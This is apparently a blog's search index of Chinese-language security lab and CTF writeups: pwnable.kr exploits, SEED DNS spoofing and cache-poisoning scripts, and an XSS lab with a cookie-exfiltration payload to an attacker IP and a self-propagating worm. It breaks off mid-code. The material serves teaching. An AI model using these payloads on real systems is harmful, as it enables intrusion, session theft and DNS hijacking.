<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[shadowsocks 源码分析]]></title>
    <url>%2F2020%2Fpython%2Fshadowsocks-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;对翻墙原理神往已久，奈何实力太菜，因此有了这篇对shadowsocks源码的分析，通过对网上资料的整理和自己对源码的解读，尝试了解它的大体框架和原理。源码基于python的2.6版本。在下文中用ss代指shadowsocks. Socks5代理&emsp;&emsp;在我们用游览器进行翻墙时，总是要将代理地址配置为127.0.0.1端口1080类似这样的，为什么要这样？这里我们需要对翻墙有个大体的认识。12socks5客户端（游览器）&lt;----socks5----&gt; sslocal(socks5服务器127.0.0.1:1080) 代理阶段，游览器发送目的服务器的数据由 sslocal 代理发送。sslocal &lt;---- 加密数据 ----&gt; sserver (解密数据）&lt;------&gt; 目标服务器 &emsp;&emsp;举个例子，游览器访问google，因为配置了socks5代理，该请求会发送到代理服务器（127.0.0.1:1080）即sslocal在此监听，sslocal收到请求后，将该请求加密，发送到sserver服务器，sserver收到信息解密后发现是访问google，于是代理访问google，收到google响应数据后，加密传回sslocal客户端，sslocal解密后传回游览器。正是中间的加密过程，使我们可以穿越墙。关于socks5协议原理：RFC1928&emsp;RFC1929wireshark抓包]]></content>
  </entry>
  <entry>
    <title><![CDATA[wifi_test]]></title>
    <url>%2F2019%2FWifi%2Fwifi-test%2F</url>
    <content type="text"><![CDATA[this is test]]></content>
      <categories>
        <category>wifi</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.kr-Toddler's Bottle Writeup]]></title>
    <url>%2F2019%2FPwn%2FPwnable-kr-Toddler-s-Bottle-Writeup%2F</url>
    <content type="text"><![CDATA[&emsp;学习了好多天的逆向工程，是时候通过实战学习一些hacking skill了。总结一下自己遇到的问题与解决方案。 collisionssh 上去后，有源码分析源码。两个条件，1.参数length 20 bytes；2.将字符串参数转为int后，5次int值相加为0x21DD9#C.可以构造0x21DD09EC = 0x06C5CEC8 * 4 + 0x06C5CECC(左边除以5),构造原因：防止0x00字符串截断即可。exploit如下:12345678910from pwn import *#context.log_level = &apos;debug&apos;payload = p32(0x06c5cec8) * 4 + p32(0x06c5cecc)p = ssh(&apos;col&apos;,&apos;pwnable.kr&apos;,password=&apos;guest&apos;,port=2222)c = p.process(argv=[&apos;col&apos;,payload],executable=&apos;./col&apos;)print(c.recv())#./col `python -c &apos;print &quot;\xc8\xce\xc5\x06&quot; *4 + &quot;\xcc\xce\xc5\x06&quot;&apos;` bof分析源码，简单的栈溢出，用ida查看栈结构，变量overflowme与key相差52字节。exploit:123456from pwn import *#context.log_level = &apos;debug&apos;payload = &apos;a&apos;*52 + p32(0xcafebabe)p = remote(&apos;pwnable.kr, 9000)p.send(payload)p.interactive() flag下载文件，运行下，没有用信息，checksec该文件，发现upx， 去壳，导入ida，分析源码，即可发现flag。gadgets：1234567891011121314151617$./flagI will malloc() and strcpy the flag there. take it.$ file flagflag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, not stripped$ checksec flag Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Packer: Packed with UPX$upx -d flag$strings flag | grep -i upxUPX...? sounds like a delivery service :) passcode:ssh上去，分析源代码，发现passcode1,2要满足一定条件才能get flag，查看passcode的输入，注意到scanf函数的参数是passcode，不能主动输入passcode的值，改变的是passcode指向的值，可以想到构造passcode的值实现任意地址写。所以首要任务就是能控制passcode的值，然后想到仅有的能控制的输入就是name数组，分析name数组与passcode的位置，看是否能覆盖。下载该文件，用ida分析一下1234567$scp -P 2222 passcode@pwnable.kr:/home/passcde/passcode . #下载到当前目录08048420 &lt;printf@plt&gt;: 8048420: ff 25 00 a0 04 08 jmp *0x804a00008048430 &lt;fflush@plt&gt;: 8048430: ff 25 04 a0 04 08 jmp *0x804a004.text:080485E3 mov dword ptr [esp], offset command ; &quot;/bin/cat flag&quot;.text:080485EA call _system 分析得到name与password1相差96字节，name大小100正好能控制passcode1的值，但不能控制passcode2的值。解决方法：控制passcode1的值为printf@got的地址（fflush@got也行），然后scanf输入passcode指向的值时传入system(“…”)的地址（注意16进制-int）(0x080485e3–&gt;134514147)，程序将在执行下个printf时跳到system，get flag.exploit:123456789from pwn import *#context.log_level = &apos;debug&apos;c = ssh(host=&apos;pwnable.kr&apos;,user=&apos;passcode&apos;,password=&apos;guest&apos;,port=&apos;2222&apos;)p = c.process(&apos;./passcode&apos;)p.recv()p.sendline(&apos;a&apos; * 96 + p32(0x0804a000))p.recvp.sendline(int(0x080485e3))print(p.recv) randomssh上去，分析源代码，程序rand()没有初始化seed，则默认seed为1，即一直是1804289393, 1804289393 ^ 0xdeadbeef = 3039230856exploit1234random@ubuntu:~$./random3039230856Good!Mommy, I thought libc random is unpredictable...]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DNS Attack]]></title>
    <url>%2F2019%2FWeb%2FDNS%20Attack%2F</url>
    <content type="text"><![CDATA[一、Local DNS Attack0. DNS概述0.1 DNS服务DNS是一个在因特网上实现分布式数据库的精彩范例。 1234主机名与ip的转换。主机别名（host aliasing). 复杂主机名有一或多个别名。eg: a.b.helloworld.com（规范主机名）的主机，可能还有hello-world和www.helloworld.com的别名。可用DNS获得主机别名对应的规范主机名和ip地址。 邮件服务器别名（mail server aliasing) MX记录允许公司的邮件服务器和Web服务器使用相同（别名化的）主机名。负载分配（load distribution）。eg：多台冗余Web服务器，ip地址集合与同一个规范主机名联系，则DNS可轮流用ip地址集合的ip进行http响应。 0.2 DNS工作原理​ 根服务器，顶级域（TLD）DNS服务器，权威DNS服务器。 递归查询：客户与本地dns服务器，迭代查询：本地与根，TLD，权威服务器通讯 0.3 DNS 记录和报文​ DNS服务器存储资源记录，包含下列四元组 ​ （Name, Value, Type, TTL） TTL觉得缓存删除的时间。 123456Type=A , Name=主机名 Value=主机名对应IP地址Type=NS Name是个域 Value是知道如何获得该域主机ip地址的权威DNS服务器的主机名 eg:(a.com, dns.a.com, NS)Type=CNAME, Name=主机别名， Value= 别名为Name的主机对应规范主机名 eg:(a.com, cc.gg.a.com,CNAME)Type=MX Name=主机别名 Value=规范主机名 eg:(a.com, mail.gg.a.com, MX)eg： 一台edu TLD服务器不是主机a.b.c.edu权威服务器，则该服务器将包含b.c.edu的域记录（c.edu,dns.c.edu, NS) , 还将包含A记录（dns.c.edu, 1.1.1.1, A) 0.4 DNS协议头部12345678910id(2字节) DNS报文的ID标识，对于请求报文和其对应的应答报文，这个字段是相同QR（1bit） 查询/响应标志，0为查询，1为响应opcode（4bit） 0表示标准查询，1表示反向查询，2表示服务器状态查询AA（1bit） 表示授权回答 应答才有意义TC（1bit） 表示可截断的RD（1bit） 表示期望递归 请求设置RA（1bit） 表示可用递归 应答设置z(3bit) 保留值rcode（4bit） 表示应答码，0表示没有差错，3表示名字差错，2表示服务器错误（Server Failure）数量字段（8字节） Questions、Answer RRs、Authority RRs、Additional RRs 1. Setting Up Lab environment1.1 Configure the User Machine​ user machine: change /etc/resolvconf/resolv.conf.d/head file. The content of the head file will be prepended to the dynamically generated resolver configuration file 计算机将从此文件下的域名服务器解析域名。 添加域名服务器到/etc/resolvconf/resolv.conf.d/head ，而不选择/etc/resolv.conf, 是因为DHCP会覆盖/etc/resolv.conf。 1234Add the following entry to /etc/resolvconf/resolv.conf.d/head nameserver 10.0.2.16Run the following command for the change to take effect$ sudo resolvconf -u 1.2 Configure the DNS Server​ 安装DNS server software BIND9 1.2.1 Configure BIND9 Server​ 设置BIND9 DNS缓存文件 修改/etc/bind/named.conf.optionsfile. 123options &#123; dump-file &quot;/var/cache/bind/dump.db&quot;;&#125;; ​ 应用设置 12$ sudo rndc dumpdb -cache // Dump the cache to the sepcified file$ sudo rndc flush // Flush the DNS cache ​ turn off DNSSEC。DNSSEC is introduced to protect against spoofing attacks on DNS servers。 modifying the named.conf.options file. 1234options &#123; # dnssec-validation auto; dnssec-enable no;&#125;; ​ 开启dns服务 1$ sudo service bind9 restart 1.2.2 Host a Zone in the Local DNS Server​ 我们使用local DNS server 作为example.com域的权威名称服务器。 创建2个区域条目，正向解析(from hostname to IP)，反向解析(from IP to hostname) ，添加下面内容于/etc/bind/named.conf 文件下。 12345678zone &quot;example.com&quot; &#123; type master; file &quot;/etc/bind/example.com.db&quot;; &#125;;zone &quot;0.168.192.in-addr.arpa&quot; &#123; type master; file &quot;/etc/bind/192.168.0.db&quot;; &#125;; ​ Create and Setup up the forward lookup zone file。/etc/bind/example.com.db 文件内容： 123456789101112131415$TTL 3D ; default expiration time of all resource records without ; their own TTL@ IN SOA ns.example.com. admin.example.com. ( 1 ; Serial 8H ; Refresh 2H ; Retry 4W ; Expire 1D ) ; Minimum@ IN NS ns.example.com. ;Address of nameserver@ IN MX 10 mail.example.com. ;Primary Mail Exchangerwww IN A 192.168.0.101 ;Address of www.example.commail IN A 192.168.0.102 ;Address of mail.example.comns IN A 192.168.0.10 ;Address of ns.example.com*.example.com. IN A 192.168.0.100 ;Address for other URL in ; the example.com domain “@”特殊符号，代表example.com。该区域文件包含7个resource records (RRs)，包括 a SOA (Start Of Authority) RR, a NS (Name Server) RR, a MX (Mail eXchanger) RR, and 4 A (host Address) RRs。‘@’ here stands for example.com. ​ Create and Setup up the reverse lookup zone file。/etc/bind/192.168.0.db文件内容： 1234567891011$TTL 3D@ IN SOA ns.example.com. admin.example.com. ( 1 8H 2H 4W 1D)@ IN NS ns.example.com.101 IN PTR www.example.com.102 IN PTR mail.example.com.10 IN PTR ns.example.com. 最后Restart the BIND server， 用 命令dig www.example.com 测试。 2. Attacks on DNS2.1 Modifying the Host File​ /etc/hosts 文件用于本地域名查询，优先于远程dns查询。if you controll users computer , you can change hosts that user will go the site which you fake. ​ dig 命名会忽视hosts文件，而ping 和web游览器不会。 2.2 Directly Spoofing Response to User​ 伪造DNS响应需要满足以下几个条件： 1234567891. src ip 为DNS服务器IP2. dst ip 为 受害者ip3. src port 534. dst port 为 DNS 请求的src port5. UDP 校验码 计算准确6. transaction ID 必须与DNS请求一致7. DNS响应的 question section 域名必须与DNS请求question section 域名一致8. DNS响应的 answer section域名必须与DNS请求question section 域名一致9. 受害者接受 攻击者的DNS 响应 须在正规DNS 响应之前。 ​ 可以通过sniff（嗅探）获取1-8的信息。下面使用工具伪造DNS reply 12345678910111213sudo netwox 105 -h &quot;www.example.com&quot; -H &quot;6.6.6.6&quot; -a &quot;ns.example.com&quot; -A &quot;6.6.6.9&quot; -f &quot;src host 192.168.10.134&quot;Parameters:-h|--hostname data hostname-H|--hostnameip ip IP address-a|--authns data authoritative nameserver-A|--authnsip ip authns IP-d|--device device device name-T|--ttl uint32 ttl in seconds-f|--filter filter pcap filter-s|--spoofip spoofip IP spoof initialization type注意： -h 字段不影响受害者想要请求的域名，该工具会自动通过嗅探修改响应域名为用户的。-h字段必须有。实际使用，提前信息收集受害者的域名和权威名称域名服务器，话说要伪造网站，的确需提前收集。 2.3 DNS Cache Poisoning Attack​ 当本地DNS服务器没有请求域名的ip信息时，会向外界DNS服务器进行查询，此次攻击通过欺骗本地DNS服务器，伪造外界DNS服务器响应，使本地DNS服务器的缓存长时间保持伪造的响应。 12345$ sudo netwox 105 -h &quot;www.example.cn&quot; -H &quot;1.2.3.4&quot; -a &quot;ns.example.cn&quot; -A &quot;1.2.3.5&quot; -f &quot;src host 10.10.10.137&quot; --spoofip &quot;raw&quot;$ sudo rndc flush$ sudo rndc dumpdb -cache #保存缓存并查看是否被spoof$ sudo cat /var/cache/bind/dump.db 2.4 DNS Cache Poisoning: Targeting the Authority Section；another Domain; Additional Section。​ 伪造Authority Section的地址，使之可以伪造整个example.net 域。若attacker32.com为我们的，则整个example.net 域都将被控制。 Authority Section和Additional Section的信息得与查询域名相关，否则不将被缓存。 1234567891011;; AUTHORITY SECTION:example.net. 259200 IN NS attacker32.com.google.com. 259200 IN NS attacker32.com.----------------------------------------------------;; AUTHORITY SECTION:example.net. 259200 IN NS attacker32.com.example.net. 259200 IN NS ns.example.net.;; ADDITIONAL SECTION:attacker32.com. 259200 IN A 1.2.3.4 ➀ns.example.net. 259200 IN A 5.6.7.8 ➁www.facebook.com. 259200 IN A 3.4.5.6 ➂ 123456789101112131415161718192021222324252627282930313233343536!/usr/bin/python #spoof DNS cache#验证本地DNS服务器缓存条目from scapy.all import *def spoof_dns(pkt): if(DNS in pkt and &apos;www.example.net&apos; in pkt[DNS].qd.qname): #swap the source and dst ip address IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) #swap src and dst port UDPpkt = UDP(dport=pkt[UDP].sport, sport=53) #The answer section Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type=&apos;A&apos;, ttl=259200, rdata=&apos;10.0.2.5&apos;) #The authority section #NSsec1 = DNSRR(rrname=&apos;example.net&apos;, type=&apos;NS&apos;, ttl=259200,rdata=&apos;ns1.example.net&apos;) #缓存 NSsec1 = DNSRR(rrname=&apos;example.net&apos;, type=&apos;NS&apos;, ttl=259200,rdata=&apos;attacker.com&apos;) #缓存 NSsec2 = DNSRR(rrname=&apos;google.com&apos;, type=&apos;NS&apos;, ttl=259200,rdata=&apos;attacker.com&apos;) #不缓存 #NSsec2 = DNSRR(rrname=&apos;example.net&apos;, type=&apos;NS&apos;, ttl=259200,rdata=&apos;ns2.example.net&apos;) #缓存 #The additional section #Addsec1 = DNSRR(rrname=&apos;ns1.example.net&apos;,type=&apos;A&apos;, ttl=259200,rdata=&apos;1.2.3.4&apos;) Addsec1 = DNSRR(rrname=&apos;attacker.com&apos;,type=&apos;A&apos;, ttl=259200,rdata=&apos;1.2.3.4&apos;) Addsec2 = DNSRR(rrname=&apos;ns2.example.net&apos;,type=&apos;A&apos;, ttl=259200,rdata=&apos;5.6.7.8&apos;) #缓存 Addsec3 = DNSRR(rrname=&apos;www.facebook.com&apos;,type=&apos;A&apos;, ttl=259200,rdata=&apos;3.4.5.6&apos;) #不缓存 #Construct the DNS packet DNSpkt = DNS(id = pkt[DNS].id, qd=pkt[DNS].qd,aa=1,rd=0,qr=1,qdcount=1,ancount=1,nscount=2,arcount=2,an=Anssec,ns=NSsec1/NSsec2,ar=Addsec1/Addsec2/Addsec3) spoofpkt = IPpkt/UDPpkt/DNSpkt send(spoofpkt)#Sniff UDP query packets and invoke spoof_dns().pkt = sniff(filter=&apos;src host 10.10.10.137 and dst port 53&apos;, prn=spoof_dns) 二、Remote DNS Attack1.1 Configure the DNS ServerStep 2: Set up a forward zone. ​ 在真实环境中我们需要知道ns.attacker32.com域名的ip地址，但我们没有真的域名。所以bind9可以设置一个转发区域，使受害者对ns.attacker32.com的访问都转发到攻击者的主机。（代替实际外网主机） 123456zone &quot;attacker32.com&quot; &#123; type forward; forwarders &#123; 10.10.10.132; &#125;;&#125;; Fix the Source Ports. /etc/bind/named.conf.options 1query-source port 33333 1.2 Configure the Attacker VM12345678910make attacker32.com.zone and example.com.zone filesStep 4: Add the following entries to /etc/bind/named.conf:zone &quot;attacker32.com&quot; &#123; type master; file &quot;/etc/bind/attacker32.com.zone&quot;;&#125;;zone &quot;example.com&quot; &#123; type master; file &quot;/etc/bind/example.com.zone&quot;;&#125;; 1.3 Testing the Setup​ Get the IP address of ns.attacker32.com Get the IP address of www.example.com. 1234567$ dig ns.attacker32.com -&gt; 10.10.10.137// Send the query to our local DNS server, which will send the query// to example.com’s official nameserver.$ dig www.example.com #官方Ip地址，非攻击者伪造的地址，即不能回应// Send the query directly to ns.attacker32.com$ dig @ns.attacker32.com www.example.com #无响应 本次攻击目的是让受害者向ns.attacker32.com询问www.example.com的IP地址。 2.1 The Kaminsky Attack​ 思路：攻击者对受害者的dns服务器请求一个不存在的example.com域名,eg: a.example.comll。由于dns服务器缓存没有该域名，所以它会请求example.com域。在dns服务器等待该回复时，攻击者可以欺骗爆破该回复，通过伪造不同的transaction ID（2^16)，直到正确。则可以指定ns.attacker32.com作为example.com域的名称服务器，达到攻击目的。如果失败（transaction ID不匹配，回复慢于真实的回复），则攻击者可以再伪造请求域名，再发送请求攻击，直到攻击成功，那么dns服务器将被缓存ns.attacker32.com 1. Construct DNS request123456#10.10.10.132--attacker 10.10.10.137--user&apos;s DNS serverQdsec = DNSQR(qname=&apos;a.example.com&apos;)dns = DNS(id=0xAAAA, qr=0, qdcouip = IP(dst=&apos;10.10.10.132&apos;, src=&apos;10.10.10.137&apos;)udp = UDP(dport=53, sport=55555, chksum=0)request = ip/udp/dns 2. Spoof DNS Replies.123456789101112name = &apos;a.example.com&apos;domain = &apos;example.com&apos;ns =&apos;ns.attacker32.com&apos;Qdsec = DNSQR(qname=name)Anssec = DNSRR(rrname=name, type=&apos;A&apos;, rdata=&apos;1.2.3.4&apos;, ttl=259200)NSsec = DNSRR(rrname=domain, type=’NS’, rdata=ns, ttl=259200)dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,qdcount=1, ancount=1, nscount=1, arcount=0,qd=Qdsec, an=Anssec, ns=NSsec)ip = IP(dst=&apos;10.10.10.137&apos;, src=&apos;199.43.135.53&apos;)udp = UDP(dport=33333, sport=53, chksum=0)reply = ip/udp/dns 3. Launch the Kaminsky Attack.​ we can put everything together to conduct the Kaminsky attack.]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[seedlab-web.md]]></title>
    <url>%2F2019%2FWeb%2Fseedlabs-web%2F</url>
    <content type="text"><![CDATA[跨站脚本攻击（Cross Site Scripting）概念&emsp;&emsp;通过插入恶意脚本代码来窃取用户信息，获取用户权限以及 配合其他漏洞发动更加复杂的攻击。恶意攻击者往 WEB 页面里插入恶意 HTML 代码，当用户浏览该页之时，嵌入其中 Web 里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。&emsp;&emsp;XSS 漏洞根据表现形式的不同，主要有以下三种类型。 反射型XSSXSS代码作为输入提交到服务端，服务端解析响应后，在响应内容出现这段代码，最后被游览器解析执行。过程像一次反射。 储存型XSSXSS攻击代码持久化储存在服务端中，当任意用户访问漏洞页面时，将触发恶意代码。 DOM型XSS与前两种不同，XSS代码的执行只在客户端，依靠游览器的DOM解析，不需要服务器解析响应的参与。 危害挂马，盗取用户cookie，DOS，钓鱼，病毒，蠕虫。 seedlabs-XSS 相关内容• Cross-Site Scripting attack• XSS worm and self-propagation• Session cookies• HTTP GET and POST requests• JavaScript and Ajax Lab TasksTask1: Posting a Malicious Message to Display an Alert Window&emsp;&emsp;登录用户（eg:Boby),在其profile的brief description 区域写入下列JavaScript代码。任意用户访问Boby的profile将弹窗。1&lt;script&gt;alert(’XSS’);&lt;/script&gt; &emsp;&emsp;如果输入区域有长度限制，而我们的js代码太长，可以将js代码写到js文件中，然后调用，如下：123&lt;script type=&quot;text/javascript&quot;src=&quot;http://www.evil.com/evil.js&quot;&gt;&lt;/script&gt; Task2: Posting a Malicious Message to Display Cookies&emsp;&emsp;在任务1同样地方，可以嵌入下列js code，用户自己的cookie将被弹窗。1&lt;script&gt; alert(document.cookie);&lt;/script&gt; Task 3: Stealing Cookies from the Victim’s Machine&emsp;&emsp;任务2只能显示用户自己的cookie，那么怎样盗取别人的cookie呢？我们可以通过XSS漏铜，嵌入恶意js请求，使用 tag,发送GET请求，将用户cookie发送到攻击者服务器，代码如下：12&lt;script type=&quot;text/javascript&quot; &gt;document.write(&apos;&lt;img src=&quot;http://10.10.10.9:5555?c=&apos;+encodeURI(document.cookie) +&apos;&gt;&apos;);&lt;/script&gt; 我们可以用nc监听5555端口，显示cookie。1nc -l 5555 -v Task 4: Becoming the Victim’s Friend&emsp;&emsp;任务要求写一个XSS worm 使得任意访问Samy’s page的用户将自动添加Samy为好友。首先我们在游览器按F12观察add friend发送的请求，如下1http://www.xsslabelgg.com/action/friends/add?friend=47&amp;__elgg_ts=1590717097&amp;__elgg_token=XOt_md4I7Ly9Hjtv3CIltw 47: 要加好友的用户id, elgg_ts,elgg_token 标明本用户身份。那么我们可以伪造该请求，使任意访问Samy页面的用户，加Samy为好友，代码如下123456789101112131415&lt;script type=&quot;text/javascript&quot;&gt;window.onload = function () &#123; var Ajax = null; var ts = &quot;&amp;__elgg_ts=&quot;+elgg.security.token.__elgg_ts; var token = &quot;&amp;__elgg_token=&quot;+elgg.security.token.__elgg_token; //Construct the HTTP request to add Samy as a friend. var sendurl = &quot;http://www.xsslabelgg.com/action/friends/add?friend=47&quot;+ts+token; //Create and send Ajax request to add friend Ajax = new XMLHttpRequest(); Ajax.open(&quot;GET&quot;,sendurl,true); Ajax.setRequestHeader(&quot;Host&quot;,&quot;www.xsslabelgg.com&quot;); Ajax.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;); Ajax.send();&#125;&lt;/script&gt; 将代码嵌入Samy‘s profile的”About me”字段，这个字段有两个模式editor和Text mode（通过点击“Edit HTML”），仅Text mode 可以执行js 代码，js会被嵌入到文本中，而Editor模式，特殊字符会被编码。 Task 5: Modifying the Victim’s Profile&emsp;&emsp;我们按游览器F12,看一下正常编辑用户profile时，发送HTTP Post请求时会发送那些参数，然后伪造，也可以用burpsuit截获请求，增减参数，看哪些是必须的，js代码如下：1234567891011121314151617181920&lt;script id=&quot;worm&quot; type=&quot;text/javascript&quot;&gt;window.onload = function () &#123;var userName = elgg.session.user.name;var guid = &quot;&amp;guid=&quot; + elgg.session.user.guid;var ts = &quot;&amp;__elgg_ts=&quot; + elgg.security.token.__elgg_ts;var token = &quot;__elgg_token=&quot; + elgg.security.token.__elgg_token;var content = token + ts + &quot;name=&quot;+ userName +&quot;&amp;description=test&quot;+ guid; var sendurl = &quot;http://www.xsslabelgg.com/action/profile/edit&quot;; var samyGuid=47; if(elgg.session.user.guid!=samyGuid) &#123; //Create and send Ajax request to modify profile var Ajax=null; Ajax=new XMLHttpRequest(); Ajax.open(&quot;POST&quot;,sendurl,true); Ajax.setRequestHeader(&quot;Host&quot;,&quot;www.xsslabelgg.com&quot;); Ajax.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;); Ajax.send(content); &#125; &#125; &lt;/script&gt; Task 6: Writing a Self-Propagating XSS Worm&emsp;&emsp;自我传播式蠕虫，任意访问Samy页面的用户，将被嵌入同样的蠕虫代码。代码如下：123456789101112131415161718192021222324&lt;script id=&quot;worm&quot; type=&quot;text/javascript&quot;&gt;window.onload = function () &#123;var userName = elgg.session.user.name;var guid = &quot;&amp;guid=&quot; + elgg.session.user.guid;var ts = &quot;&amp;__elgg_ts=&quot; + elgg.security.token.__elgg_ts;var token = &quot;__elgg_token=&quot; + elgg.security.token.__elgg_token;var headerTag = &quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;;var jsCode = document.getElementById(&quot;worm&quot;).innerHTML;var tailTag = &quot;&lt;/&quot; +&quot;script&gt;&quot;;var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); var content = token + ts + &quot;name=&quot;+ userName +&quot;&amp;description=&quot;+wormCode+ guid; var sendurl = &quot;http://www.xsslabelgg.com/action/profile/edit&quot;; var samyGuid=47; if(elgg.session.user.guid!=samyGuid) &#123; //Create and send Ajax request to modify profile var Ajax=null; Ajax=new XMLHttpRequest(); Ajax.open(&quot;POST&quot;,sendurl,true); Ajax.setRequestHeader(&quot;Host&quot;,&quot;www.xsslabelgg.com&quot;); Ajax.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;); Ajax.send(content); &#125; &#125; &lt;/script&gt; Task 7: Countermeasures&emsp;&emsp;本质上一切的安全问题是与输入相关的，只要我们可以构造不同的输入，而系统能给我们不一样的输出，一旦系统存在漏洞，那么我们就可以为所欲为。在讨论XSS防御前，我们需要先了解游览器解析html的过程。否则不容易理解防御，也不容易理解攻击绕过。 游览器解码过程&emsp;&emsp;游览器在解析HTML时，主要有这几个过程：HTML解析、CSS解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解析工作。 从图中可以看出浏览器主要做了三部分的工作。 1. HTML/SVG/XHTML 解析。解析这三种文件会产生一个DOM Tree。 2. CSS 解析，解析CSS会产生CSS规则树。 3. Javascript 解析。（暂时讨论JavaScript动态操作DOM Tree）。 4. URL解析。（这一步的先后顺序不一定，看语境）&emsp;&emsp;服务器返回游览器数据时，浏览器需要识别这一长串数据中哪些是文本字符（浏览器不需要解析，只需要显示出来），哪些是控制字符（对于HTML来说就是能够被解析为DOM Tree的字符）。作为攻击者，尽可能将用户输入的值让浏览器识别为控制字符，这样就可以造成XSS漏铜利用。&emsp;&emsp;我们的游览器在解析html时，会把1&lt;img src = 1/&gt; 这个标签解析为6个符号token,1&lt; img src = 1 / &gt; 解析过程如下12341. 在解析&lt;这个符号以前，状态是Data State2. 然后解析到&lt;的时候，解析状态变为Tag open state，然后开始搜寻标签名，（在搜寻标签名的时候，我们要思考一个问题，&lt;和标签名img并不是同一个token，他们显然是分别进行解析的，那么有没有可能忽略掉&lt;和img之间的空格或者换行什么的？这个问题，我相信很好找到答案。）3. 找到标签名，状态变为Tag name state，这个状态就表示已经识别了标签名，4. 然后知道读取到最近的一个&gt;时，结束tag name state的状态，重新进入Data State 标签的闭合与之类似，但是解析过程比较松散，所以有时不要闭合标签也可以解析。 HTML编码与解析HTML实体编码的出现，解决了一个问题，例如&lt;和&gt;这两个符号在HTML文档中出现是非常不安全的，因为这标志着标签的开始和结束，为了安全使用这些保留字符。开发人员使用了一套叫实体编码的编码策略，这类编码以&amp;开头，以分号;结尾html编码：“&amp;#数字“，“&amp;#x十六进制”，“&amp;#unicode”–&gt; eg: &amp;#128569那么html的解析发生在哪里？哪里又不能解析呢？123解析：HTML编码要在Data state（标签外部和标签的text段）和标签内的属性值的位置解析，不解析，只显示文本：Tagname/open/close state，在这三个状态中，HTML编码不会被解码的特殊模式下，即使Data State 也不会解析。特殊模式：&lt;style&gt;&lt;script&gt;&lt;textarea&gt;&lt;xmp&gt;。他们得text段不能被hTML编码解析。]]></content>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr-input2]]></title>
    <url>%2F2018%2FPwn%2Fpwnable-kr-input2%2F</url>
    <content type="text"><![CDATA[审题&emsp;&emsp;ssh，连上去看看，存在input.c源文件，那么直接分析源文件。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#code:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123; printf(&quot;Welcome to pwnable.kr\n&quot;); printf(&quot;Let&apos;s see if you know how to give input to program\n&quot;); printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;); // argv if(argc != 100) return 0; if(strcmp(argv[&apos;A&apos;],&quot;\x00&quot;)) return 0; if(strcmp(argv[&apos;B&apos;],&quot;\x20\x0a\x0d&quot;)) return 0; printf(&quot;Stage 1 clear!\n&quot;); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0; read(2, buf, 4); if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0; printf(&quot;Stage 2 clear!\n&quot;); // env if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0; printf(&quot;Stage 3 clear!\n&quot;); // file FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0; fclose(fp); printf(&quot;Stage 4 clear!\n&quot;); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf(&quot;socket error, tell admin\n&quot;); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv[&apos;C&apos;]) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf(&quot;bind error, use another port\n&quot;); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf(&quot;accept error, tell admin\n&quot;); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0; printf(&quot;Stage 5 clear!\n&quot;); // here&apos;s your flag system(&quot;/bin/cat flag&quot;); return 0;&#125; 分析&emsp;&emsp; 看了下没有溢出，看来只能正常运行程序得到flag，而想运行程序到最后需满足5个条件。 参数得100个，并且65为”\x00”,66为”\x20x0a\x0d”,67为端口号(自己定). stdin 和 stderr 得输入特定值 而特定值无法通过命令行输入得，这里我们可以通过进程间通信传。 env环境变量 “\xde\xad\xbe\xef=\xca\xfe\xba\xbe” 打开个”\x0a”文件，并读入4字节数据，满足为”\x00\x00\x00\x00”,可创建这个文件 创建了个服务器， 等待接受数据为”\xde\xad\xbe\xef”, 我们可创建客户端连接它，发送这个数据。SolvePwn–c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main()&#123; int *argv[101]=&#123;0&#125;; int pipe_stdin[2]=&#123;-1,-1&#125;,pipe_stderr[2]=&#123;-1,-1&#125;; int i; pid_t 